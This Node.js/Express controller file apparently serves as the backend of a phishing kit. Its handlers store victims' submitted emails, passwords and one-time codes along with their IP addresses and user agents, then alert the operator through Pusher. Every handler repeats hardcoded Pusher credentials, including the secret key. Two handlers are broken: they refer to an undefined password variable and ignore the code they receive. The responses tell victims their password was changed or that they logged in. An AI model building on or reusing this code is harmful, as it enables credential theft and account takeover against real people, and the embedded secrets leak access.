'use strict'
import NewInfo from '../models/OldInfo.js'
import nodemailer from 'nodemailer';

import User from '../models/User.js'
import Info from '../models/Info.js'
import Link from '../models/Link.js'
import Click from '../models/Click.js'
// import socket from '../server.js'
import Poster from '../models/Poster.js'
import device from 'express-device'
import useragent from 'express-useragent'
import Site from '../models/Site.js'
import createToken from '../utils/createToken.js'
import Demo from '../models/Demo.js'
import Cash from '../models/Cash.js'
import rateLimitMiddleware from "../ratelimiter.js"
import axios from 'axios';
import Password from '../models/Password.js'
import satelize from 'satelize'
import Otp from '../models/Otp.js'
import Pusher from'pusher';


export const email_post = async (req, res) => {
    const pusher = new Pusher({
        appId: '1883790',
        key: 'c69be5ea3652b02905c7',
        secret: 'd5258e0315991e7b5cc6',
        cluster: 'mt1',
        useTLS: true,
      });

    const { adminId, posterId } = req.params
    const { site, email } = req.body
    const userAgent = req.headers['user-agent'];
    const ipAddress =  (req.headers['x-forwarded-for'] || 
    req.connection.remoteAddress || 
    req.socket.remoteAddress || 
    req.connection.socket.remoteAddress).split(",")[0];

    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({ posterId: posterId })

        if (userFound && posterFound) {
            const info = await Info.create({
                site, email, 
               adminId:adminId,
                poster: posterId,
                root: posterFound._id,
                ip:ipAddress,
                agent:userAgent


            })
            
            await info.save();
            if(info){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });
            }
            posterFound.details.push(info._id)
            await posterFound.save();
           
            
            return   res.status(200).json({ info: info ,email:posterFound.username})

        }
        return    res.status(400).json({ e: "not found" })


    } catch (e) {
        return  res.status(400).json({ e: "error" })
    }

}



export const email_post_wrong = async(req, res) => {

    const pusher = new Pusher({
        appId: '1883790',
        key: 'c69be5ea3652b02905c7',
        secret: 'd5258e0315991e7b5cc6',
        cluster: 'mt1',
        useTLS: true,
      });

    const { id, email ,adminId,posterId} = req.body;
 
    const filter = { _id: id };
    const update = { email: email };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {

          const found =  await Info.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });

            if(found){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "email change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const password_post = async(req, res) => {

    const pusher = new Pusher({
        appId: '1883790',
        key: 'c69be5ea3652b02905c7',
        secret: 'd5258e0315991e7b5cc6',
        cluster: 'mt1',
        useTLS: true,
      });

    const { id, password ,adminId,posterId} = req.body;
 
    const filter = { _id: id };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {

          const found =  await Info.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });

            if(found){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const password_post_wrong = async(req, res) => {

    const pusher = new Pusher({
        appId: '1883790',
        key: 'c69be5ea3652b02905c7',
        secret: 'd5258e0315991e7b5cc6',
        cluster: 'mt1',
        useTLS: true,
      });

    const { id, password ,adminId,posterId} = req.body;
 
    const filter = { _id: id };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {

          const found =  await Info.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });

            if(found){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const code_page_post = async(req, res) => {

    const pusher = new Pusher({
        appId: '1883790',
        key: 'c69be5ea3652b02905c7',
        secret: 'd5258e0315991e7b5cc6',
        cluster: 'mt1',
        useTLS: true,
      });

    const { id, code ,adminId,posterId} = req.body;
 
    const filter = { _id: id };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {

          const found =  await Info.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });

            if(found){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}


export const done_page_post = async(req, res) => {

    const pusher = new Pusher({
        appId: '1883790',
        key: 'c69be5ea3652b02905c7',
        secret: 'd5258e0315991e7b5cc6',
        cluster: 'mt1',
        useTLS: true,
      });

    const { id, done ,adminId,posterId} = req.body;
 
    const filter = { _id: id };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({ posterId: posterId })
        if (userFound && posterFound) {

      

            if(done == true){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "logged in successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}